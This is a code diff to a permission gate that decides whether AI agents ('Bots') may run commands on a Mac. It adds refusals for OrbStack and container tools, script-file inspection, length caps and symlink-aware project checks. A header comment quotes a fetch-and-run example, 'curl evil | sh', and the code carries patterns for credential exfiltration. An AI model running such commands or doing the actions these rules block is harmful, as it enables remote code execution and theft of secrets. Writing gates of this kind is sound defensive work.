@@ -16,7 +16,8 @@
  * three agree bit-for-bit on what is walled, asked and allowed. Commands are parsed by ./shell-parse — a
  * real word-splitter — so `npm test && curl evil | sh` is seen as two commands and never matches "npm test".
  */
-import { parseShell, shPath, type ShCmd, type ShParse, type ShWord } from "./shell-parse";
+import { INTERPRETERS, SHELLS, parseShell, shPath, type ShCmd, type ShParse, type ShWord } from "./shell-parse";
+import { MAC_COMMAND_MAX, inOrder, realOfDeepest } from "./linear-text";
 import { messagesSend } from "./mac-messages";
 import { appDataWalls } from "./app-data";
 import { macDrivesSynapseUi, macIsToolConfig } from "./mac-sandbox";
@@ -53,7 +54,21 @@ export interface PermContext {
    * app's data (the policy key and the signed policy files) and the keychain; private keys and credential files open.
    */
   noLimits?: boolean;
+  /**
+   * Bug 431: a script file's text, for the OrbStack / container-engine NEVER. The Mac passes a reader that resolves
+   * symlinks, reads only a regular file and only up to SCRIPT_READ_CAP bytes, and returns null otherwise (unreadable,
+   * too big, not a file); the host omits it (it can't see the Mac's files). Null keeps today's verdict.
+   */
+  readScript?: (absPath: string) => string | null;
 }
+
+/** Bug 431: the most a script file the Mac gate reads may be (bytes). Bigger stays as today (a card, or the reviewer). */
+export const SCRIPT_READ_CAP = 256 * 1024;
+/** Bug 433: the most script files one command's check reads, and their most text in all. Past either: a card. */
+export const SCRIPT_READS_MAX = 32;
+export const SCRIPT_TEXT_MAX = 4 * SCRIPT_READ_CAP;
+/** Bug 433: fixed ALWAYS-ASK rules the Mac gate cards in every mode, Full auto included (it couldn't check the call). */
+export const MAC_UNCHECKED_RULES: ReadonlySet<string> = new Set(["ask.too-long", "ask.scripts-unchecked"]);
 
 export interface PermResult {
   verdict: PermVerdict;
@@ -89,14 +104,8 @@ const within = (p: string, dir: string): boolean => dir !== "/" && (p === dir ||
 /** Real on-disk path: realpath of the deepest existing ancestor + the missing tail. Lexical when no realpath. */
 function realOf(abs: string, realpath?: (p: string) => string): string {
   if (!realpath) return abs;
-  const tail: string[] = [];
-  let cur = abs;
-  for (;;) {
-    try { return lexical([realpath(cur), ...tail].join("/"), "/"); } catch { /* missing: walk up */ }
-    if (cur === "/") return abs;
-    tail.unshift(cur.slice(cur.lastIndexOf("/") + 1));
-    cur = cur.slice(0, cur.lastIndexOf("/")) || "/";
-  }
+  const real = realOfDeepest(abs, realpath); // bug 433: linear on a deep hostile path
+  return real === null ? abs : lexical(real, "/");
 }
 
 // ---------------------------------------------------------------------------------------------------------------
@@ -130,11 +139,30 @@ function isSecretKeyExport(c: ShCmd): boolean {
   return c.argv.some((w) => /--export-secret(-subkeys)?-?keys?|^-a$/.test(w.text)) && c.argv.some((w) => /export-secret/.test(w.text));
 }
 
+/**
+ * Bug 433: the folded home and app-data walls, worked out once per (home, userData) instead of once per path checked
+ * (a command with thousands of arguments folded them thousands of times).
+ */
+const foldedBases = new Map<string, { h: string; walls: string[] }>();
+let lastBase: { home: string; userData: string | null; b: { h: string; walls: string[] } } | null = null;
+function foldedBase(home: string, userData: string | null): { h: string; walls: string[] } {
+  if (lastBase && lastBase.home === home && lastBase.userData === userData) return lastBase.b;
+  const key = `${home}\0${userData ?? ""}`;
+  let b = foldedBases.get(key);
+  if (!b) {
+    if (foldedBases.size > 16) foldedBases.clear();
+    b = { h: permFold(lexical(home, "/")), walls: appDataWalls(userData).map((u) => permFold(lexical(u, "/"))) };
+    foldedBases.set(key, b);
+  }
+  lastBase = { home, userData, b };
+  return b;
+}
+
 /** The store name when this absolute path is credential exfiltration (NEVER), or null. Narrow by design. */
 function secretExfil(abs: string, home: string, userData: string | null, noLimits = false): string | null {
   const f = permFold(abs);
-  const h = permFold(lexical(home, "/"));
-  if (appDataWalls(userData).some((u) => within(f, permFold(lexical(u, "/"))))) return "the app's own data";
+  const { h, walls } = foldedBase(home, userData);
+  if (walls.some((u) => within(f, u))) return "the app's own data";
   for (const d of SECRET_ABS) if (within(f, d)) return "the keychain";
   for (const d of SECRET_HOME_DIRS) if (within(f, `${h}/${d}`)) return "the keychain";
   if (noLimits) return null; // bug 258: private keys and credential files are the user's to open in No limits
@@ -147,8 +175,7 @@ function secretExfil(abs: string, home: string, userData: string | null, noLimit
 /** True when the path is a protected store (used by write/edit walls; broader than the NEVER read). */
 function isProtectedStore(abs: string, home: string, userData: string | null): boolean {
   const f = permFold(abs);
-  const h = permFold(lexical(home, "/"));
-  if (appDataWalls(userData).some((u) => within(f, permFold(lexical(u, "/"))))) return true;
+  if (foldedBase(home, userData).walls.some((u) => within(f, u))) return true;
   for (const d of SECRET_ABS) if (within(f, d)) return true;
   return false;
 }
@@ -242,8 +269,7 @@ function askForCommand(c: ShCmd, ctx: PermContext): PermResult | null {
       if (w.text.startsWith("-")) continue;
       const abs = w.dynamic || w.glob ? null : shPath(w, c.cwd, ctx.home);
       if (!abs) return R("always-ask", "ask.rm-unclear", "This deletes files at a path that can't be checked ahead of time.");
-      const real = realOf(abs, ctx.realpath);
-      if (!inAnyProject(abs, ctx) && !inAnyProject(real, ctx)) return R("always-ask", "ask.rm-outside-project", "This deletes files outside your project folders.");
+      if (!inProjectReal(abs, ctx)) return R("always-ask", "ask.rm-outside-project", "This deletes files outside your project folders.");
     }
   }
   // A whole-tree delete of a project dir root or home is still a card even inside a project.
@@ -285,7 +311,7 @@ function permHome(ctx: PermContext): string { return lexical(ctx.home, "/"); }
 /** A protected write target → an always-ask result, or null. */
 function protectedWrite(abs: string, ctx: PermContext): PermResult | null {
   const f = permFold(abs);
-  const h = permFold(permHome(ctx));
+  const h = foldedBase(ctx.home, null).h;
   const tail = f.startsWith(h + "/") ? f.slice(h.length + 1) : "";
   for (const name of SHELL_CONFIG_FILES) if (tail === name.toLowerCase()) return R("always-ask", "ask.shell-rc", "This changes a shell startup file, which runs on every new terminal.");
   if (within(f, `${h}/library/launchagents`) || within(f, "/library/launchagents") || within(f, "/library/launchdaemons")) return R("always-ask", "ask.persistence", "This changes startup items.");
@@ -329,28 +355,47 @@ const BUILD_COMMANDS: Record<string, { any?: boolean; subs?: Set<string> }> = {
   git: {}, // handled specially (GIT_READONLY)
 };
 
+/** Bug 433: folded once per set of project dirs, not once per path checked. */
+const foldedRoots = new Map<string, string[]>();
 function permFoldedRoots(ctx: PermContext): string[] {
-  return ctx.projectDirs.filter((d) => typeof d === "string" && d.startsWith("/")).map((d) => permFold(lexical(d, "/")));
+  const key = ctx.projectDirs.join("\0");
+  let roots = foldedRoots.get(key);
+  if (!roots) {
+    if (foldedRoots.size > 16) foldedRoots.clear();
+    roots = ctx.projectDirs.filter((d) => typeof d === "string" && d.startsWith("/")).map((d) => permFold(lexical(d, "/")));
+    foldedRoots.set(key, roots);
+  }
+  return roots;
 }
 function inAnyProject(abs: string, ctx: PermContext): boolean {
   const f = permFold(abs);
   return permFoldedRoots(ctx).some((r) => within(f, r) || f === r);
 }
+/**
+ * Bug 441: inside a project dir by where the path REALLY is (symlinks in the file and every parent resolved): a link
+ * in a project to a file or folder outside it is outside. A root counts as written and as resolved.
+ */
+function inProjectReal(abs: string, ctx: PermContext): boolean {
+  if (!ctx.realpath) return inAnyProject(abs, ctx);
+  const f = permFold(realOf(abs, ctx.realpath));
+  const roots = [...permFoldedRoots(ctx), ...ctx.projectDirs.filter((d) => typeof d === "string" && d.startsWith("/")).map((d) => permFold(realOf(lexical(d, "/"), ctx.realpath)))];
+  return roots.some((r) => within(f, r) || f === r);
+}
 /** Every path/redirect argument stays inside a project dir. */
 function argsInProject(c: ShCmd, ctx: PermContext): boolean {
-  const cwdOk = c.cwd ? inAnyProject(c.cwd, ctx) : false;
+  const cwdOk = c.cwd ? inProjectReal(c.cwd, ctx) : false;
   if (!cwdOk) return false;
   for (const r of c.redirects) {
     if (!/>/.test(r.op)) continue;
     if (!r.target || r.target.dynamic) return false;
     const a = shPath(r.target, c.cwd, ctx.home);
-    if (!a || (!inAnyProject(a, ctx) && !inAnyProject(realOf(a, ctx.realpath), ctx))) return false;
+    if (!a || !inProjectReal(a, ctx)) return false;
   }
   for (const w of c.argv.slice(1)) {
     if (w.dynamic) continue; // a $VAR arg means we can't prove it stays in-project → don't fast-path (falls to reviewer)
     if (w.text.startsWith("-") || !looksPathish(w)) continue;
     const a = shPath(w, c.cwd, ctx.home);
-    if (a && !inAnyProject(a, ctx) && !inAnyProject(realOf(a, ctx.realpath), ctx)) return false;
+    if (a && !inProjectReal(a, ctx)) return false;
   }
   return true;
 }
@@ -428,13 +473,259 @@ function namesOwnData(command: string, ctx: PermContext): boolean {
   return false;
 }
 
+/** OrbStack's CLI programs: `orb` and `orbctl`, by name or by any path (OrbStack.app's bin, ~/.orbstack/bin). */
+const ORBSTACK_CLI = new Set(["orb", "orbctl"]);
+/** Bug 431: the container engines and VM CLIs a Bot may not drive on the Mac (OrbStack serves docker/kubectl into its VM). */
+const ENGINE_CLI = new Set(["docker", "docker-compose", "nerdctl", "kubectl", "limactl"]);
+/** OrbStack's own CLI folders, named anywhere in the text (a path handed to something that runs it). */
+const ORBSTACK_PATH_DIRECT = /orbstack\.app\/contents\/macos\/x?bin\b|\.orbstack\/bin\b/i;
+/** What `/orbstack\.app\/contents\/macos(?:\/[^\s'"]*)?\/(?:bin|xbin)\b|\.orbstack\/bin\b/i` found, in linear time (bug 433: its
+ *  `[^\s'"]*` retried the rest of the word from every repeat of the folder name). */
+const orbstackPath = (text: string): boolean =>
+  ORBSTACK_PATH_DIRECT.test(text) || inOrder(text, [/orbstack\.app\/contents\/macos\//i, /\/x?bin\b/i], /[\s'"]/);
+/** A word `orb`/`orbctl`, or OrbStack by name, in text the parser can't split into commands (a computed string, inline
+ *  code, a script in another language). APFS folds case, so `ORB` runs orb too. */
+const ORB_WORD = /(^|[^\w.-])(orb(ctl)?(?=$|[^\w.-])|orbstack)/i;
+/** A container-engine CLI named as a word. */
+const ENGINE_WORD = /(^|[^\w.-])(docker-compose|docker|nerdctl|kubectl|limactl)(?=$|[^\w.-])/i;
+/** `open` args that start OrbStack's app: its name or bundle (-a/-b, a path), or its URL scheme. */
+const OPEN_ORBSTACK = /(^|\/)orbstack(\.app)?\/?$|(^|\/)orbstack\.app\/|^dev\.kdrag0n\.macvirt$|^orbstack:/i;
+/** AppleScript addressing OrbStack's app (`tell application "OrbStack"`, by id too). */
+const TELL_ORBSTACK = /\bapp(lication)?\s+(id\s+)?["'](orbstack(\.app)?|dev\.kdrag0n\.macvirt)["']/i;
+/**
+ * Bug 431 follow-up: the obvious ways code in another language runs a program — a call to a process-running function
+ * whose first argument is a string literal, or a list whose first item is one. Python (os.system, os.popen, os.exec*,
+ * os.spawn*, subprocess.* and its functions imported bare), Node (exec, execSync, execFile, execFileSync, spawn, spawnSync, Bun.spawn …), Ruby and Perl
+ * (system, exec, spawn, popen, IO.popen, Open3.*, qx), AppleScript (do shell script). The string is parsed as a shell
+ * command (a lone program name or path parses as that program), so `["orb", …]` and `"orb -u root id"` are both proof.
+ */
+const EXEC_CALL = /(?:\b(?:os\.(?:system|popen|exec\w*|spawn\w*)|subprocess\.\w+|check_output|check_call|Popen|getoutput|getstatusoutput|execSync|execFileSync|execFile|exec|spawnSync|spawn|system|popen|IO\.popen|Open3\.\w+|Process\.spawn|Bun\.spawnSync|Bun\.spawn|qx)[ \t]*\(?[ \t]*\[?[ \t]*|\bdo[ \t]+shell[ \t]+script[ \t]+)(["'`])/g;
+/** Linear time on hostile text: at most this many calls are looked at, each string at most this long. */
+const EXEC_CALL_MAX = 200;
+const EXEC_STRING_MAX = 4096;
+
+type MacNever = "orbstack" | "engine";
+const MAC_NEVER: Record<MacNever, [string, string]> = {
+  orbstack: ["never.orbstack", "Bots can't use OrbStack."],
+  engine: ["never.containers", "Bots can't use Docker or other container tools."],
+};
+/** A plain word match in code the parser can't prove runs it: a card, not a refusal (a comment or a string may name it). */
+const MAC_ASK: Record<MacNever, [string, string]> = {
+  orbstack: ["ask.orbstack", "This code names OrbStack, which Bots can't use."],
+  engine: ["ask.containers", "This code names Docker or another container tool, which Bots can't use."],
+};
+const fold = (p: string): string => p.toLowerCase();
+/** What code (inline or a script) proves (`never`) or merely names (`ask`). */
+interface CodeHit { never: MacNever | null; ask: MacNever | null; unchecked?: boolean }
+
+/**
+ * 0.1.4 (Local network, concern 1): a Bot's Mac command never runs OrbStack's CLI, whatever its arguments. `orb -u root`
+ * is root in the Bots' computer (its firewall, every Bot's files), and Bots have no reason to drive OrbStack. Covers the
+ * program itself (any path), every wrapper the parser peels (env, xargs, command, exec, nohup, sudo …), `sh|bash|zsh -c`
+ * and `eval` bodies, and OrbStack's bin folders named anywhere. Text the parser can't split (a computed string) that
+ * names `orb` counts too.
+ *
+ * Bug 431 widened it: docker / docker-compose / nerdctl / kubectl / limactl (OrbStack's engine and VM, and no Bot prompt,
+ * skill or test uses them on the Mac), `open` or AppleScript of OrbStack's app, a program name built at run time (`$o`,
+ * `$(…)`, backticks, a shell reading its commands from input, `xargs -I% %`) when the text names any of them, code in
+ * another language that plainly runs one (see EXEC_CALL), and the script files the command runs (see macScriptJudge).
+ * Code that only NAMES one (a comment, a string) is a card: see macCodeJudge.
+ */
+export function macRunsOrbStack(command: string, parse: ShParse): boolean {
+  return macNeverKind(command, parse) === "orbstack";
+}
+
+function macNeverKind(command: string, parse: ShParse, depth = 0): MacNever | null {
+  if (orbstackPath(command)) return "orbstack";
+  let engine = false;
+  for (const c of parse.cmds) {
+    const names = [fold(c.program), ...c.wrappers.map(fold)];
+    if (names.some((n) => ORBSTACK_CLI.has(n))) return "orbstack";
+    if (names.some((n) => ENGINE_CLI.has(n))) engine = true;
+    if (c.program === "open" && c.argv.slice(1).some((w) => OPEN_ORBSTACK.test(w.dynamic ? w.literal : w.text))) return "orbstack";
+    for (const code of [...c.inlineCode, ...fedCode(c)]) {
+      const hit = codeRuns(code, c.cwd, depth);
+      if (hit === "orbstack") return hit;
+      if (hit) engine = true;
+    }
+  }
+  // A program name computed at run time (or a shell reading its commands from input) could be any of them: the text
+  // naming one is enough.
+  if (parse.opaque.length > 0 || parse.cmds.some((c) => c.programFromInput && SHELLS.has(c.program))) {
+    if (ORB_WORD.test(command)) return "orbstack";
+    if (ENGINE_WORD.test(command)) engine = true;
+  }
+  return engine ? "engine" : null;
+}
+
+/** The program text a non-shell interpreter reads from a heredoc or here-string (`python3 <<EOF`), as inline code. */
+function fedCode(c: ShCmd): string[] {
+  if (!c.programFromInput || SHELLS.has(c.program) || (c.stdin !== "heredoc" && c.stdin !== "herestring")) return [];
+  const r = c.redirects.find((x) => x.heredoc !== null);
+  return r ? [c.stdin === "heredoc" ? r.heredoc! : (r.target ? (r.target.dynamic ? r.target.literal : r.target.text) : "")] : [];
+}
+
+/** Code in another language that plainly runs OrbStack or a container engine (EXEC_CALL), or addresses OrbStack's app. */
+function codeRuns(code: string, cwd: string | null, depth: number): MacNever | null {
+  if (TELL_ORBSTACK.test(code)) return "orbstack";
+  if (depth > 1 || !/orb|docker|nerdctl|kubectl|limactl/i.test(code)) return null; // fast path: nothing to prove
+  let engine = false;
+  let n = 0;
+  for (const m of code.matchAll(EXEC_CALL)) {
+    if (++n > EXEC_CALL_MAX) break;
+    const q = m[1]!;
+    const start = m.index + m[0].length;
+    let cmd = "";
+    let k = start;
+    for (; k < code.length && k - start < EXEC_STRING_MAX; k++) {
+      const ch = code[k]!;
+      if (ch === "\\") { cmd += code[k + 1] ?? ""; k++; continue; }
+      if (ch === q) break;
+      cmd += ch;
+    }
+    if (code[k] !== q) continue;
+    const hit = macNeverKind(cmd, parseShell(cmd, { cwd, home: "/" }), depth + 1);
+    if (hit === "orbstack") return hit;
+    if (hit) engine = true;
+  }
+  return engine ? "engine" : null;
+}
+
+/** Code the parser can't split: proof (EXEC_CALL) is NEVER, a plain word match is a card. */
+function codeJudge(code: string, cwd: string | null): CodeHit {
+  const never = codeRuns(code, cwd, 0);
+  const ask = never ? null : ORB_WORD.test(code) || orbstackPath(code) ? "orbstack" : ENGINE_WORD.test(code) ? "engine" : null;
+  return { never, ask };
+}
+
+/** Inline code and non-shell interpreters fed their program from input (`python3 <<EOF`, `echo … | node`): word matches
+ *  that weren't proof are a card. */
+function macCodeAsk(command: string, parse: ShParse): MacNever | null {
+  let engine = false;
+  // Bug 433: the whole command is judged once, not once per piped interpreter (quadratic on `python3|python3|…`). The
+  // judgement doesn't depend on the cwd (it looks at program names and code, never at where a path resolves).
+  let whole: MacNever | null | undefined;
+  for (const c of parse.cmds) {
+    // An interpreter reading code from a pipe: all we have is the command's text.
+    const piped = c.programFromInput && !SHELLS.has(c.program) && !fedCode(c).length;
+    const judged = [...c.inlineCode, ...fedCode(c)].map((code) => codeJudge(code, c.cwd).ask);
+    if (piped) {
+      if (whole === undefined) whole = codeJudge(command, c.cwd).ask;
+      judged.push(whole);
+    }
+    for (const hit of judged) {
+      if (hit === "orbstack") return hit;
+      if (hit) engine = true;
+    }
+  }
+  return engine ? "engine" : null;
+}
+
+/** A script file's text, judged as the command it is: shell text is parsed (one level: its own scripts aren't read) and
+ *  proof is NEVER; anything else (python, node, ruby, perl …) is judged as inline code is. */
+function scriptJudge(text: string, shell: boolean, cwd: string | null, home: string): CodeHit {
+  if (!shell) return codeJudge(text, cwd);
+  return { never: macNeverKind(text, parseShell(text, { cwd, home })), ask: null };
+}
+
+/** A shebang line's interpreter: is it a shell? `#!/usr/bin/env -S bash -e` → bash. */
+function shebangIsShell(line: string): boolean {
+  const ws = line.slice(2).trim().split(/\s+/);
+  let k = 0;
+  if (ws[k]?.split("/").pop() === "env") { k++; while (ws[k]?.startsWith("-")) k++; }
+  const prog = ws[k]?.split("/").pop() ?? "";
+  return SHELLS.has(prog);
+}
+
+/**
+ * Bug 431: the script files a Mac command runs — `bash|sh|zsh x.sh`, `source`/`.`, `python|node|ruby|perl … x`, a shell
+ * or interpreter fed a file on stdin (`sh < x.sh`), and a file run directly by path (`./x.sh`, a shebang or plain-text
+ * script) — are read (ctx.readScript: symlinks resolved, regular files only, capped) and judged by the same rules. One
+ * level only: a script's own scripts aren't read. No reader (the host), an unreadable or too-big file, or a relative
+ * path after an unknown `cd`: today's verdict stands. Commands that run no script read nothing.
+ */
+function macScriptJudge(parse: ShParse, ctx: PermContext): CodeHit {
+  const out: CodeHit = { never: null, ask: null };
+  const read = ctx.readScript;
+  if (!read) return out;
+  const seen = new Set<string>();
+  let textRead = 0;
+  const judge = (w: ShWord | undefined | null, cwd: string | null, how: "shell" | "code" | "direct"): CodeHit | null => {
+    if (!w || w.procSubst !== null) return null;
+    const abs = shPath(w, cwd, ctx.home);
+    if (!abs || seen.has(abs)) return null;
+    // Bug 433: a command naming thousands of scripts would read and parse each one. Past the budget: unchecked.
+    if (seen.size >= SCRIPT_READS_MAX || textRead > SCRIPT_TEXT_MAX) { out.unchecked = true; return null; }
+    seen.add(abs);
+    const text = read(abs);
+    if (text === null) return null;
+    textRead += text.length;
+    if (how !== "direct") return scriptJudge(text, how === "shell", cwd, ctx.home);
+    if (text.startsWith("#!")) {
+      const nl = text.indexOf("\n");
+      const line = nl < 0 ? text : text.slice(0, nl);
+      const hit = macNeverKind(line.slice(2), parseShell(line.slice(2), { cwd, home: ctx.home }));
+      return hit ? { never: hit, ask: null } : scriptJudge(text, shebangIsShell(line), cwd, ctx.home);
+    }
+    // No shebang: a text file runs in the shell (ENOEXEC); a binary (a NUL in it) isn't a script.
+    return text.includes("\0") ? null : scriptJudge(text, true, cwd, ctx.home);
+  };
+  for (const c of parse.cmds) {
+    const p = c.program;
+    const args = c.argv.slice(1);
+    const stdinFile = c.stdin === "file" ? c.redirects.find((r) => (r.fd === null || r.fd === 0) && r.op === "<")?.target : null;
+    let hit: CodeHit | null = null;
+    if (SHELLS.has(p)) {
+      if (c.programFromInput) hit = judge(stdinFile, c.cwd, "shell");
+      else {
+        for (let k = 0; k < args.length; k++) {
+          const t = args[k]!.text;
+          if (/^[-+]o$/.test(t)) { k++; continue; }
+          if (/^-[A-Za-z]+$/.test(t) && !args[k]!.quoted) { if (t.includes("c")) break; continue; }
+          if (t === "--") { hit = judge(args[k + 1], c.cwd, "shell"); break; }
+          if (/^--/.test(t) || /^\+[A-Za-z]+$/.test(t)) continue;
+          hit = judge(args[k], c.cwd, "shell");
+          break;
+        }
+      }
+    } else if (p === "source" || p === ".") {
+      hit = judge(args[0], c.cwd, "shell");
+    } else if (p !== "awk" && (INTERPRETERS[p] ?? INTERPRETERS[p.replace(/[0-9.]+$/, "")])) {
+      if (c.programFromInput) hit = judge(stdinFile, c.cwd, "code");
+      else if (!c.inlineCode.length) hit = judge(args.find((w) => !w.text.startsWith("-")), c.cwd, "code");
+    } else if (c.argv[0] && !c.argv[0].dynamic && c.argv[0].text.includes("/")) {
+      hit = judge(c.argv[0], c.cwd, "direct");
+    }
+    if (hit?.never) return { never: hit.never, ask: null };
+    if (out.unchecked) return out;
+    if (hit?.ask && out.ask !== "orbstack") out.ask = hit.ask;
+  }
+  return out;
+}
+
 export function evaluateFixedRules(action: PermAction, ctx: PermContext): PermResult {
   if (action.kind === "command") {
+    // Bug 433: a Mac command too long to check is a card (after the linear NEVER for the app's own data), never deeper
+    // analysis: a Bot can't stall the gate with a huge hostile command.
+    if (action.side === "mac" && (action.command ?? "").length > MAC_COMMAND_MAX) {
+      if (namesOwnData(action.command ?? "", ctx)) return R("never", "never.app-data", "Reading or changing the app's own data (its permission key and records) is never allowed.");
+      return R("always-ask", "ask.too-long", "This command is too long to check ahead of time.");
+    }
     if (namesOwnData(action.command ?? "", ctx)) return R("never", "never.app-data", "Reading or changing the app's own data (its permission key and records) is never allowed.");
     // Fix round (review of bug 258): a Bot may never drive Synapse's own app (its approval cards, its settings, the No
     // limits confirm). A hard NEVER in every mode, No limits included.
     if (action.side === "mac" && macDrivesSynapseUi(action.command ?? "")) return R("never", "never.synapse-ui", "Driving Synapse's own app is never allowed.");
     const parse: ShParse = parseShell(action.command ?? "", { cwd: action.cwd ?? ctx.projectDirs[0] ?? ctx.home, home: ctx.home, vars: ctx.vars });
+    // 0.1.4: OrbStack's CLI is root in the Bots' computer (its firewall, Local network). A hard NEVER in every mode.
+    let script: CodeHit = { never: null, ask: null };
+    // Bug 431: container engines, `open` of OrbStack, computed program names that name them, and the scripts it runs.
+    if (action.side === "mac") {
+      const hit = macNeverKind(action.command ?? "", parse);
+      if (hit) return R("never", MAC_NEVER[hit][0], MAC_NEVER[hit][1]);
+      script = macScriptJudge(parse, ctx);
+      if (script.never) return R("never", MAC_NEVER[script.never][0], MAC_NEVER[script.never][1]);
+      if (script.unchecked) return R("always-ask", "ask.scripts-unchecked", "This runs more scripts than can be checked ahead of time.");
+    }
     // A word-splitting failure (unterminated quote, opaque zsh construct, computed program name) → always-ask:
     // we could not prove what runs.
     // The box is a disposable Linux container with its own reviewer and static analysis (host/review/*). The fixed
@@ -458,6 +749,10 @@ export function evaluateFixedRules(action: PermAction, ctx: PermContext): PermRe
     // Bug 142: a Messages send (iMessage / SMS as the user) is always a card, naming who gets what.
     const sms = messagesSend(action.command ?? "");
     if (sms) return R("always-ask", "ask.messages-send", `This sends a message as you to ${sms.recipient}: “${sms.text.slice(0, 300)}”.`);
+    // Bug 431: inline code or a script in another language that names OrbStack or a container tool without plainly
+    // running it (a comment, a string): a card, not a refusal. Checked after the NEVER walls.
+    const named = macCodeAsk(action.command ?? "", parse) ?? script.ask;
+    if (!askHit && named) askHit = R("always-ask", MAC_ASK[named][0], MAC_ASK[named][1]);
     if (askHit) return askHit;
     if (parse.opaque.length > 0) return R("always-ask", "ask.unparseable", `This command can't be fully checked ahead of time (${parse.opaque[0]}).`, proposeExact(action));
     if (allAllow) return { verdict: "always-allow", rule: "allow.command", reason: "" };
@@ -472,11 +767,11 @@ export function evaluateFixedRules(action: PermAction, ctx: PermContext): PermRe
     return action.side === "mac" ? R("always-allow", "allow.read-file", "") : R("defer", "defer", "");
   }
   // write / edit. The box's own gate handles box writes; the fixed rules give the box only the NEVER wall.
-  if (isProtectedStore(abs, ctx.home, ctx.userData ?? null)) return R("never", "never.write-secret-store", "Writing into the keychain or the app's own data is never allowed.");
+  if (isProtectedStore(abs, ctx.home, ctx.userData ?? null) || isProtectedStore(realOf(abs, ctx.realpath), ctx.home, ctx.userData ?? null)) return R("never", "never.write-secret-store", "Writing into the keychain or the app's own data is never allowed.");
   if (action.side !== "mac") return R("defer", "defer", "");
   const hit = protectedWrite(abs, ctx) ?? protectedWrite(realOf(abs, ctx.realpath), ctx);
   if (hit) return hit;
-  if (action.kind === "edit" && inAnyProject(abs, ctx)) return R("always-allow", "allow.edit-in-project", "");
+  if (action.kind === "edit" && inProjectReal(abs, ctx)) return R("always-allow", "allow.edit-in-project", "");
   return R("defer", "defer", "");
 }
 
